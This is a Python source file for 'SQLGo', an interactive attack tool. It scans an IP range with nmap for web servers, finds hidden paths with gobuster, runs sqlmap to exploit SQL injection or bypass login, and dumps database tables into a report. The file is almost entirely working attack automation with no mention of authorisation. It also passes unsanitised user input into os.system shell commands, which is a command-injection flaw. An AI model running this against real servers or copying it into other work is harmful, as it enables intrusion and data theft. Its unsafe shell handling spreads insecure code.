#!/usr/bin/env python

import os
import nmap

flag = [False, False, False]

if os.geteuid() != 0:
    print("\nYou must run this script as a root user.\n")
    response = input("Continue anyway for script testing purposes? y/n ")
    if response != "y":
        exit(0)


def nmap_scan():
    resultnmapreport = ""
    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")

    nm = nmap.PortScanner()
    nm.scan(hosts = ip_addr, arguments = '--open -n -sV -p80,443')
    num = 0

    #exit if no web servers found
    if  len(nm.all_hosts()) == 0:
        print()
        response = input("No hosts found. Please use another IP range.\nPress 'q' to quit or anything to start over: ")
        if response == "q":
            exit(0)
        else:
            return "error", "", ip_addr

    print()
    for host in nm.all_hosts():
        num+= 1
        if 80 in nm[host]['tcp'] and 443 in nm[host]['tcp']:
            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 80/tcp, 443/tcp' + ' | Server: ' + str(nm[host]['tcp'][80]['product']) + str(nm[host]['tcp'][80]['version']) + " " + str(nm[host]['tcp'][80]['extrainfo']) + "\n"
            resultnmapreport += line
        elif 80 in nm[host]['tcp']:
            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 80/tcp' + ' | Server: ' + str(nm[host]['tcp'][80]['product']) + str(nm[host]['tcp'][80]['version']) + " " + str(nm[host]['tcp'][80]['extrainfo']) + "\n"
            resultnmapreport += line
        else:
            line = '[' + str(num) + ']' + ' | IP Address: ' + str(host) + ' | State: ' + str(nm[host].state()) + ' | Ports Open: 443/tcp' + "\n"
            resultnmapreport += line
    resultnmapreport += "\n"
    print(resultnmapreport)

    print('Now, lets look for hidden paths in the webserver that could be exploitable')
    webserver = input('Type the IP Address that you would like to attack: ')

    return webserver, resultnmapreport, ip_addr



def gobuster(webserver):

    if(os.path.exists('/usr/share/sqlgo/gobust.txt')): #clears folder if it exists to avoid having information from two seperate application runs
        os.system("rm /usr/share/sqlgo/gobust.txt")

    cmd = "gobuster -o /usr/share/sqlgo/gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt > /usr/share/sqlgo/gobusteroutput.txt"
    try:
        os.system(cmd)
        resultstr = parseBuster()
        if resultstr == "error":
            response = input("Press 'q' to quit or type another webserver: ")
            if response == 'q':
                exit(0)
            else:
                return "error", response
        else:
            print()
            print("Hidden paths in the given webserver:")
            os.system(resultstr)
            print()
            return resultstr, webserver
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")

def parseBuster():
    count = len(open("/usr/share/sqlgo/gobusteroutput.txt").readlines())
    if count < 15:
        print()
        print("Unable to connect to given webserver.")
        return "error"
    else:
        cmd = "cat /usr/share/sqlgo/gobust.txt"
        return cmd


def getHiddenPath():
    hidden_path = input("What hidden path would you like to SQL inject? ")
    return hidden_path

def inject_options_output():
    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection", "Bypass Login Authentication"]
    print("\nWhich option would you like to use in SQLMap?\n")
    counter = 1
    for option in options:
        print(counter, option, "\n")
        counter += 1
    option = input("\nPlease type the corresponding type number: ")
    return option

def sqlmap(webserver, hidden_path, option_chosen):
    global flag

    result = ""
    if option_chosen == "1" or option_chosen == "2" or option_chosen == "3":
        option_chosen = int(option_chosen)

    else:
        return "error", ["error"]

    if option_chosen == 1:
        flag[0] = True
        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + "?id=1&Submit=Submit#\""

    if option_chosen == 2:
        flag[1] = True
        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt 2>&1"
        os.system(curlcmd)
        paramstring = parseCurl()
        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring

    if option_chosen == 3:
        flag[2] = True
        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt 2>&1"
        os.system(curlcmd)
        paramstring = parseCurl()
        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring

    cmd = base_cmd + " --dbs  --batch " + " > /usr/share/sqlgo/sqlmapoutput.txt"

    try:
        os.system(cmd)
        resultstr = parseSqlMap()
        if resultstr == "error":
            response = input("Press 'q' to quit or anything to display the SQLMap options again: ")
            if response == 'q':
                exit(0)
            else:
                return "error", ["error"]
    except KeyboardInterrupt:
        print ("SQLMap failed. Run script again")
    return base_cmd, resultstr



def parseSqlMap():
    s = open("/usr/share/sqlgo/sqlmapoutput.txt", "r")
    print()
    result = []
    resultstr = ""
    line_iter = iter(s)
    for line in line_iter:
        line = line.rstrip()
        if "[*]" in line:
            result.append(line)

    if(len(result) == 2):
        resultstr = "error"
        print("This path does not seem to be injectible by the option chosen.")
        return resultstr

    print("Available Databases:")
    for i in range(1, len(result)-1):
        print(result[i])
    print()
    return result


def parseCurl():
    with open("/usr/share/sqlgo/curloutput.txt", encoding="utf8", errors='ignore') as f:
        contents = f.readlines()
    result = []
    resultstr = "\""

    for line in contents:
        if "name" in line:
            s = line.split("\"")
            for word in s:
                if "name=" in word:
                    index = s.index(word)
                    index += 1
                    param = s[index]
                    result.append(param)

    for param in result:
        resultstr = resultstr + param + "=1&"
    resultstr += "\""
    return resultstr


def database_search(base_cmd, database_list):
    database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
    cmd = base_cmd + " -D " + database +  " --tables --batch > /usr/share/sqlgo/sqlmapdb.txt"
    try:
        os.system(cmd)
        status, tables = checkdb()
        if status == "error":
            response = input("Press 'q' to quit or anything to display the databases again: ")
            if response == 'q':
                exit(0)
            else:
                return status, tables
        else:
            return database, tables
    except KeyboardInterrupt:
        print ("SQLMap - search for database failed. Run script again")


def checkdb():
    s = open("/usr/share/sqlgo/sqlmapdb.txt", "r")
    result = []
    resultstr = ""
    count=0
    always_print = False
    lines = s.readlines()
    for line in lines:
        line = line.rstrip()
        if always_print or "Database" in line:
            result.append(line)
            always_print=True
        if "+-" in line:
            count+=1
        if count == 2:
            always_print=False

    if len(result) == 0:
        print("Unable to retrieve tables from chosen database.")
        return "error", result

    print()
    print("Available Tables:")
    for table in result:
        print(table)
    print()
    return "ok", result


def table_dump(base_cmd, database):
    table = input("Let's look inside the tables. Choose a table to display its contents: ")
    cmd = base_cmd + " --dump -D " + database +  " -T " + table + " --batch > /usr/share/sqlgo/sqlmapdata.txt"
    try:
        os.system(cmd)
        status = parseData()
        if status == "error":
            response = input("Press 'q' to quit or anything to display the tables again: ")
            if response == 'q':
                exit(0)
            else:
                return status, table
    except KeyboardInterrupt:
        print ("SQLMap - search for database table failed. Run script again")
    return status, table

def parseData():
    s = open("/usr/share/sqlgo/sqlmapdata.txt", "r")
    result = []
    resultstr = ""
    count=0
    always_print = False
    lines = s.readlines()

    for line in lines:
        line = line.rstrip()
        if always_print or "Database" in line:
            result.append(line)
            always_print=True
        if "+-" in line:
            count+=1
        if count == 3:
            always_print=False

    if len(result) == 0:
        print("Unable to retrieve entries from chosen table.")
        return "error"

    print()
    print("Entries Found:")
    for data in result:
        print(data)
    print()

    return result

def intro():
    ascii_title =  "____   __   __       ___   __  \n/ ___) /  \ (  )     / __) /  \ \n\___ \(  O )/ (_/\  ( (_ \(  O )\n(____/ \__\)\____/   \___/ \__/      \n\n"
    print(ascii_title)
    response = input("Type 'info' for information, anything else to continue to application: ")
    return response

def info():
    print("This tool:\n1) pings the desired network range for live hosts,\n2) scans for ports 80, 443 for web servers,\n3) uses Gobuster to show any hidden files and directories,\n4) tries to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.")
    response = input("Type 'c' to continue to application, anything else to quit: ")
    if response == "c":
        execute_sqlgo()
    else:
        exit(0)

def output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, database, table_chosen):

    if option_chosen == "1":
        str = "SQLMap Option 1 Chosen: Exploit vulnerable input parameters.\n"
    if option_chosen == "2":
        str = "SQLMap Option 2 Chosen: Exploit form-based SQL Injection.\n"
    if option_chosen == "3":
        str = "SQLMap Option 3 Chosen: Bypass login authentication.\n"


    response = input("Would you like to create a report that includes the full nmap, gobuster, and SQLMAP scans?\nType 'y' for yes, anything else for no: ")
    if response == "y":

        f = open('/usr/share/sqlgo/sqlgo_report.txt', 'w+')
        f.write("################################################################################################################\n")
        f.write("BEGINNING OF REPORT\n")
        f.write("################################################################################################################\n")

        if(resultnmapreport != ""):
            f.write("\n################################################################################################################\n")
            f.write("NMAP SCAN OUTPUT - WEBSERVERS FOUND\n")
            f.write("\nCommand: nmap -n --open -p80,443 -sV " + ip_addr)
            f.write("\n################################################################################################################\n")
            f.write("\n")
            f.write(resultnmapreport)

        if(os.path.exists('/usr/share/sqlgo/gobusteroutput.txt')):
            f.write("\n################################################################################################################\n")
            f.write("GOBUSTER OUTPUT - HIDDEN PATHS FOUND ON THE GIVEN WEBSERVER\n")
            f.write("\nCommand: gobuster -o /usr/share/sqlgo/gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt > /usr/share/sqlgo/gobusteroutput.txt")
            f.write("\n################################################################################################################\n")
            f.write("\n")
            with open('/usr/share/sqlgo/gobusteroutput.txt', 'r') as file:
                data = file.read()
            f.write(data)

        f.write("\n################################################################################################################\n")
        f.write("SQLMAP OUTPUT - DATABASES FOUND\n\n")
        if(os.path.exists('/usr/share/sqlgo/sqlmapoutput.txt') and base_cmd != "error"):
            f.write(str)
            f.write("\nCommand: " + base_cmd + " --dbs  --batch > /usr/share/sqlgo/sqlmapoutput.txt\n")
            f.write("\n################################################################################################################\n")
            f.write("\n")
            with open('/usr/share/sqlgo/sqlmapoutput.txt', 'r') as file:
                data = file.read()
            f.write(data)
        else:
            f.write("No databases found. Unable to perform SQL Injection on this path.")


        f.write("\n################################################################################################################\n")
        f.write("\nSQLMAP OUTPUT - TABLES FOUND\n\n")
        if(os.path.exists('/usr/share/sqlgo/sqlmapdb.txt')):
            f.write(str)
            f.write("\nCommand: " + base_cmd + " -D " + database + " --tables --batch > /usr/share/sqlgo/sqlmapdb.txt\n")
            f.write("\n################################################################################################################\n")
            f.write("\n")
            with open('/usr/share/sqlgo/sqlmapdb.txt', 'r') as file:
                data = file.read()
            f.write(data)
        else:
            f.write("No tables found. Unable to perform SQL Injection on this path.")


        f.write("\n################################################################################################################\n")
        f.write("\nSQLMAP OUTPUT - ENTRIES FOUND\n\n")
        if(os.path.exists('/usr/share/sqlgo/sqlmapdata.txt')):
            f.write(str)
            f.write("\nCommand: " + base_cmd + " -D " + database + " -T " + table_chosen + " --dump  --batch > /usr/share/sqlgo/sqlmapdata.txt\n")
            f.write("\n################################################################################################################\n")
            f.write("\n")
            with open('/usr/share/sqlgo/sqlmapdata.txt', 'r') as file:
                data = file.read()
            f.write(data)
        else:
            f.write("No entries found. Unable to perform SQL Injection on this path.")

        f.write("\n################################################################################################################\n")
        f.write("END OF REPORT")
        f.write("\n################################################################################################################\n")

        print()
        print("Report created. The path to the report is: /usr/share/sqlgo/sqlgo_report.txt. Goodbye!")



def execute_sqlgo():
    global flag

    if(os.path.exists('/usr/share/sqlgo/')): #clears folder if it exists to avoid having information from two seperate application runs
        cmd = "rm -r /usr/share/sqlgo"
        userresponse = input("There exists a SQLGo report from a previous run of this tool.\nPress 'c' to delete the existing folder and continue with the application. Press anything else to quit: ")
        if userresponse == 'c':
            try:
                os.system(cmd)
            except KeyboardInterrupt:
                print ("Deleting folder failed - QUITTING")
            os.mkdir('/usr/share/sqlgo')
        else:
            print("The path to the existing folder from the last run of this tool is: /usr/share/sqlgo. Goodbye!")
            exit(0)

    webserver, resultnmapreport, ip_addr = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
    while webserver == "error":
        webserver, resultnmapreport, ip_addr = nmap_scan()

    pathlist, response = gobuster(webserver)
    while pathlist == "error":
        pathlist, response = gobuster(response)
    webserver = response
    hidden_path = getHiddenPath()

    option_chosen = inject_options_output()
    base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)
    while base_cmd == "error":
        if flag[0] and flag[1] and flag[2]:
            print()
            print("All options of SQLMap have been chosen. This path is not vulnerable to SQL injection.")
            userinput = input("Press 'q' to quit the application or anything to display the hidden paths again: ")
            if userinput == 'q':
                output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, "", "")
                exit(0)
            else:
                print()
                os.system("cat /usr/share/sqlgo/gobust.txt")
                flag = [False, False, False]
                print()
                hidden_path = getHiddenPath()

        option_chosen=inject_options_output()
        base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)

    print("Success. This hidden path is vulnerable to SQL Injection.")
    if option_chosen == "1":
        print("We successfully exploited vulnerable input parameters.\n")
    if option_chosen == "2":
        print("We successfully exploited form-based SQL Injection.\n")
    if option_chosen == "3":
        print("We successfully bypassed login authentication.\n")

    status, tables = database_search(base_cmd, database_list)
    while status == "error":
        print()
        print("Available Databases:")
        for i in range(1, len(database_list)-1):
            print(database_list[i])
        print()
        status, tables = database_search(base_cmd, database_list)


    datastatus, table_chosen = table_dump(base_cmd, status)
    while datastatus == "error":
        print()
        print("Available Tables:")
        for table in tables:
            print(table)
        print()
        datastatus, table_chosen = table_dump(base_cmd, status)

    output_file(ip_addr, webserver, resultnmapreport, option_chosen, base_cmd, status, table_chosen)

if __name__ == "__main__":
    response = intro()
    if response == "info":
        info()
    else:
        execute_sqlgo()
